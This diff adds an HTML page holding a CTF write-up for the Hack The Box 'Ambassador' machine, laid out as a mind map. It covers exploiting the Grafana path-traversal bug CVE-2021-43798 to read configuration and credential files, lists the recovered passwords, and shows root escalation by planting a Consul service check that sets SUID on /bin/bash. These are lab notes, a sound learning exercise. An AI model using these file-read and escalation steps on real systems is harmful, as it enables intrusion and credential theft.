@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<link rel="stylesheet" href="/assets/css/syntax.css" type="text/css" />
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>Hack The Box - Ambassador [Medium]</title><!-- Begin Jekyll SEO tag v2.7.1 -->
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Hack The Box - Ambassador [Medium]" />
+<meta name="author" content="Dimitar Ganev" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Markmap" />
+<meta property="og:description" content="Markmap" />
+<link rel="canonical" href="http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador.html" />
+<meta property="og:url" content="http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador.html" />
+<meta property="og:site_name" content="archive://syl" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-21T00:00:00+03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box - Ambassador [Medium]" />
+<script type="application/ld+json">
+{"author":{"@type":"Person","name":"Dimitar Ganev"},"@type":"BlogPosting","description":"Markmap","headline":"Hack The Box - Ambassador [Medium]","dateModified":"2023-08-21T00:00:00+03:00","datePublished":"2023-08-21T00:00:00+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador.html"},"url":"http://localhost:4000/ctf-writeup/2023/08/21/htb-ambassador.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="archive://syl" /><link rel="shortcut icon" type="image/x-icon" href="/logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+</head><body a="auto">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">..</a><article>
+  <p class="post-meta">
+    <time datetime="2023-08-21 00:00:00 +0300">2023-08-21</time>
+  </p>
+  
+  <h1>Hack The Box - Ambassador [Medium]</h1>
+
+  <html>
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<title>Markmap</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+}
+#mindmap {
+  display: block;
+  width: 100vw;
+  height: 100vh;
+}
+</style>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets@11.8.0/styles/default.min.css" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/markmap-toolbar@0.15.3/dist/style.css" />
+</head>
+<body>
+<svg id="mindmap"></svg>
+<script src="https://cdn.jsdelivr.net/npm/d3@7.8.5/dist/d3.min.js"></script><script src="https://cdn.jsdelivr.net/npm/markmap-view@0.15.3/dist/browser/index.js"></script><script src="https://cdn.jsdelivr.net/npm/markmap-toolbar@0.15.3/dist/index.js"></script><script>(r => {
+                setTimeout(r);
+              })(() => {
+  const {
+    markmap,
+    mm
+  } = window;
+  const {
+    el
+  } = markmap.Toolbar.create(mm);
+  el.setAttribute('style', 'position:absolute;bottom:20px;right:20px');
+  document.body.append(el);
+})</script><script>((getMarkmap, getOptions, root, jsonOptions) => {
+          const markmap = getMarkmap();
+          window.mm = markmap.Markmap.create('svg#mindmap', (getOptions || markmap.deriveOptions)(jsonOptions), root);
+        })(() => window.markmap,null,{"type":"heading","depth":0,"payload":{"lines":[0,1]},"content":"Ambassador","children":[{"type":"heading","depth":1,"payload":{"lines":[2,3]},"content":"PORTS","children":[{"type":"heading","depth":2,"payload":{"lines":[4,5]},"content":"TCP","children":[{"type":"list_item","depth":3,"payload":{"lines":[6,7]},"content":"Discovered open port 3306/tcp on 10.10.11.183","children":[{"type":"list_item","depth":4,"payload":{"lines":[7,8]},"content":"MySQL 8.0.30-0ubuntu0.20.04.2","children":[]}]},{"type":"list_item","depth":3,"payload":{"lines":[8,9]},"content":"Discovered open port 80/tcp on 10.10.11.183","children":[{"type":"list_item","depth":4,"payload":{"lines":[9,10]},"content":"Hugo 0.94.2","children":[]},{"type":"list_item","depth":4,"payload":{"lines":[10,11]},"content":"http-title: Ambassador Development Server","children":[]}]},{"type":"list_item","depth":3,"payload":{"lines":[11,12]},"content":"Discovered open port 22/tcp on 10.10.11.183","children":[{"type":"list_item","depth":4,"payload":{"lines":[12,13]},"content":"OpenSSH 8.2p1 Ubuntu 4ubuntu0.5","children":[]}]},{"type":"list_item","depth":3,"payload":{"lines":[13,14]},"content":"Discovered open port 3000/tcp on 10.10.11.183","children":[{"type":"list_item","depth":4,"payload":{"lines":[14,15]},"content":"HTTP/1.0 302 Found","children":[]}]}]},{"type":"heading","depth":2,"payload":{"lines":[16,17]},"content":"UDP","children":[{"type":"list_item","depth":3,"payload":{"lines":[18,19]},"content":"None","children":[]}]}]},{"type":"heading","depth":1,"payload":{"lines":[20,21]},"content":"HTTP 10.10.11.183:80","children":[{"type":"heading","depth":2,"payload":{"lines":[24,25]},"content":"Content","children":[{"type":"list_item","depth":3,"payload":{"lines":[28,29]},"content":"user: <code>developer</code>","children":[]}]}]},{"type":"heading","depth":1,"payload":{"lines":[31,32]},"content":"HTTP 10.10.11.183:3000","children":[{"type":"heading","depth":2,"payload":{"lines":[35,36]},"content":"Content","children":[{"type":"heading","depth":3,"payload":{"lines":[37,38]},"content":"Unauthorized","children":[{"type":"list_item","depth":4,"payload":{"lines":[38,39]},"content":"Grafana[8.2.0]","children":[]}]},{"type":"heading","depth":3,"payload":{"lines":[40,41]},"content":"Authorized","children":[{"type":"list_item","depth":4,"payload":{"lines":[42,43]},"content":"Data Source - <code>mysql.yml</code>","children":[]}]}]},{"type":"heading","depth":2,"payload":{"lines":[44,45]},"content":"Login","children":[{"type":"heading","depth":3,"payload":{"lines":[46,47]},"content":"<code>admin:messageInABottle685427</code>","children":[]}]},{"type":"heading","depth":2,"payload":{"lines":[48,49]},"content":"CVEs","children":[{"type":"heading","depth":3,"payload":{"lines":[50,51]},"content":"CVE-2021-43798 *","children":[{"type":"fence","depth":4,"content":"<pre><code><span class=\"hljs-symbol\">developer:</span><span class=\"hljs-symbol\">x:</span><span class=\"hljs-number\">1000</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">1000</span><span class=\"hljs-symbol\">:developer</span><span class=\"hljs-symbol\">:/home/developer</span><span class=\"hljs-symbol\">:/bin/bash</span>\n</code></pre>\n","children":[],"payload":{"lines":[52,55]}},{"type":"bullet_list","depth":4,"payload":{"lines":[56,63]},"content":"","children":[{"type":"list_item","depth":5,"payload":{"lines":[56,57]},"content":"<code>/var/lib/grafana/grafana.db</code>","children":[]},{"type":"list_item","depth":5,"payload":{"lines":[57,58]},"content":"<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code>","children":[]},{"type":"list_item","depth":5,"payload":{"lines":[58,59]},"content":"<code>/etc/grafana/grafana.ini</code>","children":[{"type":"list_item","depth":6,"payload":{"lines":[59,60]},"content":"<code>admin_password = messageInABottle685427</code>","children":[]}]},{"type":"list_item","depth":5,"payload":{"lines":[60,61]},"content":"<code>/etc/grafana/provisioning/datasources/mysql.yml</code>","children":[{"type":"list_item","depth":6,"payload":{"lines":[61,62]},"content":"<code>grafana:dontStandSoCloseToMe63221!</code>","children":[]}]}]}]}]}]},{"type":"heading","depth":1,"payload":{"lines":[63,64]},"content":"DB 3306","children":[{"type":"list_item","depth":2,"payload":{"lines":[67,68]},"content":"<code>use whackywidget; -&gt; select * from users; -&gt; developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==</code>","children":[{"type":"list_item","depth":3,"payload":{"lines":[68,69]},"content":"<code>anEnglishManInNewYork027468</code>","children":[{"type":"list_item","depth":4,"payload":{"lines":[69,70]},"content":"userFlag","children":[]}]}]}]},{"type":"heading","depth":1,"payload":{"lines":[71,72]},"content":"SSH 22","children":[{"type":"list_item","depth":2,"payload":{"lines":[75,76],"index":1},"content":"1. Files on the System","children":[{"type":"list_item","depth":3,"payload":{"lines":[76,77]},"content":"<code>/home/developer/.gitconfig</code>","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[77,78]},"content":"<code>/opt/my-app/</code>","children":[{"type":"list_item","depth":4,"payload":{"lines":[78,79]},"content":"<code>/opt/my-app/put-config-in-consul.sh</code>","children":[{"type":"list_item","depth":5,"payload":{"lines":[79,80]},"content":"<code>consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD</code>","children":[]}]}]},{"type":"list_item","depth":3,"payload":{"lines":[80,81]},"content":"<code>/home/developer/.profile</code>","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[81,82]},"content":"<code>/home/developer/.bash_history</code>","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[82,83]},"content":"<code>/root/</code> ?","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[83,84]},"content":"<code>consul</code> *","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[84,85]},"content":"<code>/opt/consul/raft/raft.db</code>","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[85,86]},"content":"<code>/development-machine-documentation/*</code>","children":[{"type":"list_item","depth":4,"payload":{"lines":[86,87]},"content":"<code>/development-machine-documentation/deploy.sh</code>","children":[]}]},{"type":"list_item","depth":3,"payload":{"lines":[87,88]},"content":"<code>/opt/my-app/whackywidget/put-config-in-consul.sh</code>","children":[]}]},{"type":"list_item","depth":2,"payload":{"lines":[88,89],"index":2},"content":"2. Installed Applications","children":[{"type":"list_item","depth":3,"payload":{"lines":[89,90]},"content":"consul","children":[]}]},{"type":"list_item","depth":2,"payload":{"lines":[90,91],"index":3},"content":"3. Network","children":[{"type":"list_item","depth":3,"payload":{"lines":[91,92]},"content":"tcp 127.0.0.1:8300","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[92,93]},"content":"tcp 127.0.0.1:8301","children":[{"type":"list_item","depth":4,"payload":{"lines":[93,94]},"content":"empty reply for HTTP","children":[]}]},{"type":"list_item","depth":3,"payload":{"lines":[94,95]},"content":"tcp 127.0.0.1:8302","children":[{"type":"list_item","depth":4,"payload":{"lines":[95,96]},"content":"empty reply for HTTP","children":[]}]},{"type":"list_item","depth":3,"payload":{"lines":[96,97]},"content":"tcp 127.0.0.1:8500","children":[{"type":"list_item","depth":4,"payload":{"lines":[97,98]},"content":"Consul UI","children":[]},{"type":"list_item","depth":4,"payload":{"lines":[98,99]},"content":"Content: <code>Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart</code>","children":[]}]},{"type":"list_item","depth":3,"payload":{"lines":[99,100]},"content":"tcp 127.0.0.1:8600","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[100,101]},"content":"tcp 127.0.0.1:3306","children":[]}]},{"type":"list_item","depth":2,"payload":{"lines":[101,102],"index":4},"content":"4. Running Processes","children":[{"type":"list_item","depth":3,"payload":{"lines":[102,103]},"content":"<code>/usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl</code>","children":[]}]},{"type":"list_item","depth":2,"payload":{"lines":[103,104],"index":5},"content":"5. Scheduled Jobs/Tasks","children":[{"type":"list_item","depth":3,"payload":{"lines":[104,105]},"content":"<code>find /etc/consul.d/config.d/* -mmin +10 -delete</code>","children":[]}]},{"type":"list_item","depth":2,"payload":{"lines":[105,106],"index":6},"content":"6. System","children":[{"type":"list_item","depth":3,"payload":{"lines":[106,107]},"content":"Sudo version 1.8.31","children":[]},{"type":"list_item","depth":3,"payload":{"lines":[107,108]},"content":"PermitRootLogin yes","children":[]}]}]},{"type":"heading","depth":1,"payload":{"lines":[109,110]},"content":"Consul Research","children":[{"type":"list_item","depth":2,"payload":{"lines":[111,112]},"content":"https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations","children":[]},{"type":"list_item","depth":2,"payload":{"lines":[112,113]},"content":"https://developer.hashicorp.com/consul/docs/services/usage/checks","children":[]},{"type":"list_item","depth":2,"payload":{"lines":[113,114]},"content":"https://developer.hashicorp.com/consul/commands/exec","children":[]}]},{"type":"heading","depth":1,"payload":{"lines":[115,116]},"content":"Root","children":[{"type":"list_item","depth":2,"payload":{"lines":[116,117]},"content":"<code>export CONSUL_HTTP_TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5</code>","children":[]},{"type":"list_item","depth":2,"payload":{"lines":[117,118]},"content":"<code>consul catalog nodes</code>","children":[{"type":"list_item","depth":3,"payload":{"lines":[118,119]},"content":"<code>ambassador 27361fb5-583a-5db0-27bf-ecfed7b4b669 127.0.0.1 dc1 lan=127.0.0.1, lan_ipv4=127.0.0.1, wan=127.0.0.1, wan_ipv4=127.0.0.1 consul-network-segment=</code>","children":[]}]},{"type":"list_item","depth":2,"payload":{"lines":[119,120]},"content":"<code>find / -type d -writable 2&gt;/dev/null</code>","children":[{"type":"list_item","depth":3,"payload":{"lines":[120,121]},"content":"<code>/etc/consul.d/config.d</code>","children":[]}]},{"type":"list_item","depth":2,"payload":{"lines":[121,122]},"content":"<code>touch /etc/consul.d/config.d/syl.hcl</code>","children":[{"type":"list_item","depth":3,"payload":{"lines":[122,137]},"content":"<pre><code class=\"language-hcl\">service {\n    name = &quot;dummy-service&quot;\n    id   = &quot;dummy-service-1&quot;\n    port = 8080\n\n    check = {\n        id = &quot;mem-util&quot;\n        name = &quot;Memory utilization&quot;\n        args = [&quot;chmod&quot;, &quot;u+s&quot;, &quot;/bin/bash&quot;]\n        interval = &quot;10s&quot;\n        timeout = &quot;1s&quot;\n    }\n}\n</code></pre>\n","children":[]}]},{"type":"list_item","depth":2,"payload":{"lines":[137,138]},"content":"<code>consul reload</code>","children":[]},{"type":"list_item","depth":2,"payload":{"lines":[138,139]},"content":"<code>/bin/bash -p</code>","children":[]}]}]},{})</script>
+</body>
+</html>
+
+</article>
+      </div>
+    </main>
+  </body>
+</html>
